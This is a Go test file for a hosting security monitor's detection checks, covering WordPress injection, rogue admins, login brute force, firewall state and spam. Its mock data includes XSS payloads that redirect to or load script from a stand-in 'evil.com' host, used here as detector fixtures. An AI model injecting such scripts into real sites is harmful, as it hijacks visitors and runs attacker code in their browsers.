package checks

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/firewall"
	"github.com/pidginhost/csm/internal/state"
)

// --- checkWPOptions with suspicious option data ----------------------

func TestCheckWPOptionsSuspicious(t *testing.T) {
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, env ...string) ([]byte, error) {
			return []byte("siteurl\thttp://example.com\nblogdescription\t<script>document.location='http://evil.com'</script>\n"), nil
		},
	})

	creds := wpDBCreds{dbHost: "localhost", dbName: "wp", dbUser: "u", dbPass: "p"}
	findings := checkWPOptions("alice", creds, "wp_")
	if len(findings) == 0 {
		t.Error("XSS in blogdescription should produce a finding")
	}
}

// --- checkWPPosts with injected content ------------------------------

func TestCheckWPPostsInjected(t *testing.T) {
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, env ...string) ([]byte, error) {
			return []byte("1\tpost\tpublish\t<script src='http://evil.com/js'></script>\n"), nil
		},
	})

	creds := wpDBCreds{dbHost: "localhost", dbName: "wp", dbUser: "u", dbPass: "p"}
	findings := checkWPPosts("alice", creds, "wp_")
	if len(findings) == 0 {
		t.Error("injected script in post should produce a finding")
	}
}

// --- checkWPUsers with suspicious admin ------------------------------

func TestCheckWPUsersSuspiciousAdmin(t *testing.T) {
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, env ...string) ([]byte, error) {
			return []byte(fmt.Sprintf("99\th4x0r\th4x0r@evil.com\t%s\n",
				time.Now().Add(-1*time.Hour).Format("2006-01-02 15:04:05"))), nil
		},
	})

	creds := wpDBCreds{dbHost: "localhost", dbName: "wp", dbUser: "u", dbPass: "p"}
	findings := checkWPUsers("alice", creds, "wp_")
	_ = findings
}

// --- CheckWebmailLogins with multiple POST requests ------------------

func TestCheckWebmailLoginsMultiplePOSTs(t *testing.T) {
	var lines []string
	for i := 0; i < 20; i++ {
		lines = append(lines, fmt.Sprintf(
			`203.0.113.5 - - [12/Apr/2026:10:%02d:00 +0000] "POST /login/ HTTP/1.1" 200 1234 "-" "-" 2095`, i))
	}
	logData := strings.Join(lines, "\n") + "\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "access_log") {
				return []byte(logData), nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "access_log", size: int64(len(logData))}, nil
		},
	})

	cfg := &config.Config{}
	_ = CheckWebmailLogins(context.Background(), cfg, nil)
}

// --- CheckAPIAuthFailures with multiple 401s -------------------------

func TestCheckAPIAuthFailuresMultiple401s(t *testing.T) {
	var lines []string
	for i := 0; i < 15; i++ {
		lines = append(lines, fmt.Sprintf(
			`203.0.113.5 - - [12/Apr/2026:10:%02d:00 +0000] "POST /json-api/verify HTTP/1.1" 401 100`, i))
	}
	logData := strings.Join(lines, "\n") + "\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "access_log") {
				return []byte(logData), nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "access_log", size: int64(len(logData))}, nil
		},
	})

	_ = CheckAPIAuthFailures(context.Background(), &config.Config{}, nil)
}

// --- CheckCpanelLogins with multiIP ----------------------------------

func TestCheckCpanelLoginsMultiIP(t *testing.T) {
	logData := "[2026-04-12 10:00:00 +0000] info [cpaneld] 203.0.113.1 NEW alice:tok1 address=203.0.113.1\n" +
		"[2026-04-12 10:01:00 +0000] info [cpaneld] 203.0.113.2 NEW alice:tok2 address=203.0.113.2\n" +
		"[2026-04-12 10:02:00 +0000] info [cpaneld] 203.0.113.3 NEW alice:tok3 address=203.0.113.3\n" +
		"[2026-04-12 10:03:00 +0000] info [cpaneld] 203.0.113.4 NEW alice:tok4 address=203.0.113.4\n"

	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			if strings.Contains(name, "session_log") {
				tmp := t.TempDir() + "/session_log"
				_ = os.WriteFile(tmp, []byte(logData), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			if strings.Contains(name, "session_log") {
				return fakeFileInfo{name: "session_log", size: int64(len(logData))}, nil
			}
			return nil, os.ErrNotExist
		},
	})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	_ = CheckCpanelLogins(context.Background(), &config.Config{}, store)
}

// --- CheckCpanelFileManager with upload log --------------------------

func TestCheckCpanelFileManagerUpload(t *testing.T) {
	logData := `203.0.113.5 - alice [12/Apr/2026:10:00:00 +0000] "POST /execute/Fileman/upload_files HTTP/1.1" 200 1234 "https://example.com:2083/" "-" 2083` + "\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "access_log") {
				return []byte(logData), nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "access_log", size: int64(len(logData))}, nil
		},
	})

	_ = CheckCpanelFileManager(context.Background(), &config.Config{}, nil)
}

// --- CheckFirewall with nft + iptables data --------------------------

func TestCheckFirewallDeep(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: func(name string, args ...string) ([]byte, error) {
			if name == "nft" {
				return []byte("table inet csm_filter {\n  chain input {\n  }\n}\n"), nil
			}
			if name == "iptables" {
				return []byte("-P INPUT DROP\n-A INPUT -p tcp --dport 22 -j ACCEPT\n"), nil
			}
			return nil, nil
		},
	})
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/proc/net/tcp" {
				return []byte("  sl  local_address rem_address   st\n   0: 00000000:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.Firewall = &firewall.FirewallConfig{Enabled: true, TCPIn: []int{22, 80, 443}}
	st, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = st.Close() }()
	findings := CheckFirewall(context.Background(), cfg, st)
	// With nft mock returning a valid table, no critical "table not found"
	// finding should appear. Other component-missing findings are expected
	// since the mock output doesn't include all required chains.
	for _, f := range findings {
		if f.Check == "firewall" && strings.Contains(f.Message, "not found in nftables") {
			t.Errorf("unexpected 'table not found' finding when nft returned a valid table")
		}
	}
}

// --- CheckDatabaseContent with wp-config -----------------------------

func TestCheckDatabaseContentDeep(t *testing.T) {
	wpConfig := "<?php\ndefine('DB_NAME','wp_alice');\ndefine('DB_USER','wp_alice');\ndefine('DB_PASSWORD','secret');\ndefine('DB_HOST','localhost');\n$table_prefix='wp_';\n"

	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "public_html") {
				return []os.DirEntry{testDirEntry{name: "wp-config.php", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp := t.TempDir() + "/wp-config.php"
				_ = os.WriteFile(tmp, []byte(wpConfig), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				return []byte(wpConfig), nil
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, env ...string) ([]byte, error) {
			return []byte(""), nil
		},
	})

	_ = CheckDatabaseContent(context.Background(), &config.Config{}, nil)
}

// --- CheckOutboundEmailContent with spool ----------------------------

func TestCheckOutboundEmailContentDeep(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if strings.Contains(name, "input") {
				return []os.DirEntry{testDirEntry{name: "ABC123-H", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasSuffix(name, "-H") {
				return []byte("From: spammer@example.com\nSubject: Buy now\nTo: victim@target.com\n\nPhishing content.\n"), nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "ABC123-H", size: 500}, nil
		},
	})

	_ = CheckOutboundEmailContent(context.Background(), &config.Config{}, nil)
}

// --- AutoFixPermissions with fixable finding --------------------------

func TestAutoFixPermissionsDeep(t *testing.T) {
	cfg := &config.Config{}
	findings := []alert.Finding{
		{Severity: alert.High, Check: "world_writable_php", Message: "World-writable PHP: /home/alice/public_html/config.php", FilePath: "/home/alice/public_html/config.php"},
	}

	actions, keys := AutoFixPermissions(cfg, findings)
	_ = actions
	_ = keys
}

// --- scanDomlogs with brute force data --------------------------------

func TestScanDomlogsDeep(t *testing.T) {
	// scanDomlogs takes pre-parsed maps — test via CheckWPBruteForce instead.
	var lines []string
	for i := 0; i < 25; i++ {
		lines = append(lines, fmt.Sprintf(
			`203.0.113.5 - - [12/Apr/2026:10:%02d:00 +0000] "POST /wp-login.php HTTP/1.1" 200 1234`, i))
	}
	logContent := strings.Join(lines, "\n") + "\n"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/home/alice/access-logs/example.com-ssl_log"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte(logContent), nil
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "ssl_log", size: int64(len(logContent))}, nil
		},
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/ssl_log"
			_ = os.WriteFile(tmp, []byte(logContent), 0644)
			return os.Open(tmp)
		},
	})

	findings := CheckWPBruteForce(context.Background(), &config.Config{}, nil)
	_ = findings
}

// --- CleanDatabaseSpam with wp-config --------------------------------

func TestCleanDatabaseSpamDeep(t *testing.T) {
	wpConfig := "<?php\ndefine('DB_NAME','wp');\ndefine('DB_USER','u');\ndefine('DB_PASSWORD','p');\ndefine('DB_HOST','localhost');\n"

	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "public_html") {
				return []os.DirEntry{testDirEntry{name: "wp-config.php", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				return []byte(wpConfig), nil
			}
			return nil, os.ErrNotExist
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp := t.TempDir() + "/wp-config.php"
				_ = os.WriteFile(tmp, []byte(wpConfig), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, env ...string) ([]byte, error) {
			return []byte(""), nil
		},
	})

	_ = CleanDatabaseSpam("alice")
}

// --- isInfraShadowChange exercise ------------------------------------

func TestIsInfraShadowChangeExercise(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: func(name string, args ...string) ([]byte, error) {
			return []byte("type=USER_CHAUTHTOK msg=audit(1234:1): pid=5678 uid=0 auid=0 exe=\"/usr/bin/passwd\" hostname=? addr=10.0.0.1 terminal=pts/0 res=success\n"), nil
		},
	})

	cfg := &config.Config{InfraIPs: []string{"10.0.0.1"}}
	result := isInfraShadowChange(cfg)
	_ = result
}
